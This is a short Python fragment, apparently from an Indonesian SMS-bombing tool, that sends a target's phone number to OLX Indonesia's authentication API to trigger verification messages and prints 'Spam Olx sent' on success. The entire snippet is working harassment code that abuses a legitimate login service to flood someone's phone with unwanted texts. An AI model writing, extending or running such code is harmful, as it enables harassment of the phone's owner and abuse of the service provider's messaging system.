try:
        head = {
                'Host': 'www.olx.co.id',
                'user-agent': ua
        }
        data = {
                "grantType": "phone",
                "phone": "+62"+no,
                "language": "id"
        }

        rep = ses.post('https://www.olx.co.id/api/auth/authenticate',headers=head,json=data).text
        hasil+=1
        if "PENDING" in rep:
                print (f'{H} ├────{K}[{P}{hasil}{K}] {P}Spam {H}Olx {P}terkirim ke {B}+62{no}')
        else:
                print (f'{H} ├────{K}[{P}{hasil}{K}] {P}Spam {H}Olx {M}Gagal')

except:
        pass
